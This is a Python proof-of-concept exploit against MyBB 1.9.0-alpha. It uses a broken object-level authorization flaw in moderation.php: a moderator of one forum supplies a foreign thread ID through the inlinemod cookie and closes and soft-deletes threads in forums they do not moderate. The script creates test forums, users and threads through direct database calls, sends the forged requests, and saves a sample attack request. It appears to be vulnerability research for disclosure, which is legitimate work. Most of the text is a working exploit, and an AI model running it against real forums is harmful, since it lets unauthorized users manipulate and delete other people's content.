#!/usr/bin/env python3
"""
VULN-003 — Cross-forum inline multi-thread moderation via a client-controlled cookie.

Target  : MyBB 1.9.0-alpha.1 (dev-1.9, commit f8bf4e8)
Sink    : targets/mybb/moderation.php:1902-1915 (multiclosethreads; +7 sibling handlers)
          getids() moderation.php:3477-3506 (reads cookie inlinemod_forum{fid}, NOT forum-scoped)
          close_threads()/soft_delete_threads() in inc/class_moderation.php (0 is_moderator calls)
Class   : CWE-863 Broken object-level authorization (horizontal escalation)

The flaw
--------
The inline forum-mode thread handlers take the thread IDs from the client cookie
`inlinemod_forum{fid}` (getids, int-cast, NOT filtered to the forum) but check the
moderator's permission only against the URL-supplied `fid`:

    $threads = getids($fid, 'forum');                 // tids from cookie, any forum
    if(!is_moderator($fid, 'canopenclosethreads')) {  // checks ONLY the URL fid
        error_no_permission();
    }
    $moderation->close_threads($threads);             // acts on arbitrary tids, no re-check

So a moderator of forum A can close/soft-delete/approve/… threads in forum B that
they do not moderate — board-wide thread manipulation by a single-forum mod. The
search-mode branch of the same handlers uses is_moderator_by_tids() (the correct
per-object check), proving this is a regression, not intent.

What this run proves
--------------------
A moderator of forum A (only) closes AND soft-deletes a thread in forum B — which
they do not moderate — by supplying its tid in the inlinemod cookie.
"""
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import mybb_common as m

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    print((f"\033[1;{_C[tag]}m[{tag}]\033[0m " if _USE_COLOR and tag in _C else f"[{tag}] ") + msg)


HERE = os.path.dirname(os.path.abspath(__file__))
BASE = m.BASE_URL
FORUM_A = int(os.environ.get("FORUM_A", "2"))   # the forum the attacker DOES moderate


def clone_forum_b():
    """Create forum B by cloning forum A's row (fid auto-assigned); return its fid."""
    cols = ("name,description,linkto,type,pid,parentlist,disporder,active,open,threads,posts,"
            "lastpost,lastposter,lastposteruid,lastposttid,lastpostsubject,allowhtml,allowmycode,"
            "allowsmilies,allowimgcode,allowvideocode,allowpicons,allowtratings,usepostcounts,"
            "usethreadcounts,requireprefix,password,showinjump,style,overridestyle,rulestype,"
            "rulestitle,rules,unapprovedthreads,unapprovedposts,deletedthreads,deletedposts,"
            "defaultdatecut,defaultsortby,defaultsortorder")
    sel = ("'Forum B (cvh)',description,linkto,type,pid,parentlist,disporder+1,active,open,0,0,"
           "0,'',0,0,'',allowhtml,allowmycode,allowsmilies,allowimgcode,allowvideocode,allowpicons,"
           "allowtratings,usepostcounts,usethreadcounts,requireprefix,password,showinjump,style,"
           "overridestyle,rulestype,rulestitle,rules,0,0,0,0,defaultdatecut,defaultsortby,defaultsortorder")
    m.db(f"INSERT INTO mybb_forums ({cols}) SELECT {sel} FROM mybb_forums WHERE fid={FORUM_A};")
    fid_b = int(m.db("SELECT MAX(fid) FROM mybb_forums;").strip())
    m.db(f"UPDATE mybb_forums SET parentlist='1,{fid_b}' WHERE fid={fid_b};")
    m.rebuild_forums_cache()
    return fid_b


def make_thread(fid, uid, subject):
    now = int(time.time())
    m.db("INSERT INTO mybb_threads (fid,subject,prefix,icon,uid,username,dateline,firstpost,lastpost,"
         "lastposter,lastposteruid,views,replies,closed,sticky,notes,visible,unapprovedposts,"
         "attachmentcount,deletedposts) "
         f"VALUES ({fid},{m._sql_str(subject)},0,0,{uid},'cvh',{now},0,{now},'cvh',{uid},0,0,0,0,'',1,0,0,0);")
    return int(m.db(f"SELECT tid FROM mybb_threads WHERE fid={fid} AND uid={uid} ORDER BY tid DESC LIMIT 1;").strip())


def main():
    print("=" * 72)
    print("VULN-003: cross-forum inline moderation via client cookie")
    print(f"Target: {BASE}")
    print("=" * 72)
    log("INFO", "exercising moderation.php:1902 multiclosethreads — perm checks URL fid, acts on cookie tids")

    fid_b = clone_forum_b()
    log("SETUP", f"forum A = {FORUM_A} (attacker moderates); created forum B = {fid_b} (attacker does NOT)")

    # a thread in forum B, owned by some other user
    victim_uid = m.create_user(m.rand("bowner_"), "Bp!" + m.secrets.token_hex(3))
    tid_b = make_thread(fid_b, victim_uid, "Victim thread in forum B " + m.secrets.token_hex(3))
    log("SETUP", f"victim thread tid={tid_b} created in forum B (fid {fid_b})")

    # the attacker: a Registered user made moderator of forum A ONLY
    mod = m.rand("amod_")
    pw = "Am!" + m.secrets.token_hex(3)
    mod_uid = m.create_user(mod, pw, usergroup=2)
    m.set_mod(mod_uid, FORUM_A)   # per-forum moderator of A with canopenclose/cansoftdelete/...
    log("SETUP", f"attacker {mod} (uid={mod_uid}, Registered) is a moderator of forum A ({FORUM_A}) only")

    mc = m.new_session()
    if not m.login(mc, mod, pw):
        log("FAIL", "attacker login failed")
        return 1
    pk = m.post_key(mc, f"/newthread.php?fid={FORUM_A}")

    closed_before = m.db(f"SELECT closed FROM mybb_threads WHERE tid={tid_b};").strip()
    # The cross-forum trick: set inlinemod_forum{A} to a tid that lives in forum B.
    mc.cookies[f"inlinemod_forum{FORUM_A}"] = str(tid_b)
    log("STEP", f"POST moderation.php multiclosethreads fid={FORUM_A} with Cookie inlinemod_forum{FORUM_A}={tid_b}")
    log("INFO", f"is_moderator({FORUM_A}) passes for the attacker; getids returns the forum-B tid unfiltered")
    r = mc.post("/moderation.php", data={
        "action": "multiclosethreads", "fid": str(FORUM_A),
        "inlinetype": "forum", "my_post_key": pk,
    }, allow_redirects=False)
    closed_after = m.db(f"SELECT closed FROM mybb_threads WHERE tid={tid_b};").strip()
    log("INFO", f"HTTP {r.status_code}; forum-B thread closed: before={closed_before} after={closed_after}")
    closed_ok = (closed_before == "0" and closed_after == "1")
    if closed_ok:
        log("PROOF", f"a moderator of forum A closed thread {tid_b} in forum B (which they do NOT moderate) "
                     f"— authorization validated the URL fid, action hit a cookie-supplied cross-forum tid")

    # destructive variant: soft-delete the same cross-forum thread
    vis_before = m.db(f"SELECT visible FROM mybb_threads WHERE tid={tid_b};").strip()
    log("STEP", f"POST moderation.php multisoftdeletethreads fid={FORUM_A} (same cross-forum tid)")
    mc.post("/moderation.php", data={
        "action": "multisoftdeletethreads", "fid": str(FORUM_A),
        "inlinetype": "forum", "my_post_key": pk,
    }, allow_redirects=False)
    vis_after = m.db(f"SELECT visible FROM mybb_threads WHERE tid={tid_b};").strip()
    softdel_ok = (vis_after == "-1")
    log("INFO", f"forum-B thread visible: before={vis_before} after={vis_after} (-1 = soft-deleted)")
    if softdel_ok:
        log("PROOF", f"the same section mod SOFT-DELETED the cross-forum thread (destructive) — visible={vis_after}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("# attacker moderates forum A only; target thread lives in forum B\n"
                f"POST /moderation.php HTTP/1.1\nHost: {BASE.split('://')[1]}\n"
                "Content-Type: application/x-www-form-urlencoded\n"
                f"Cookie: mybbuser=<A-mod uid_loginkey>; inlinemod_forum{FORUM_A}={tid_b}\n\n"
                f"action=multiclosethreads&fid={FORUM_A}&inlinetype=forum&my_post_key=<key>\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"forum A (moderated) = {FORUM_A}; forum B (NOT moderated) = {fid_b}; victim tid={tid_b}\n"
                f"multiclosethreads   : closed {closed_before} -> {closed_after}\n"
                f"multisoftdeletethreads: visible {vis_before} -> {vis_after} (-1 = soft-deleted)\n")

    print("-" * 72)
    if closed_ok or softdel_ok:
        log("OK", "exploit confirmed — cross-forum thread manipulation by a single-forum moderator")
        print("==> VULN-003: CONFIRMED — section mod closes/soft-deletes threads board-wide via inlinemod cookie")
        return 0
    log("FAIL", "cross-forum thread was not modified — handler may now scope per-object")
    print("==> VULN-003: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
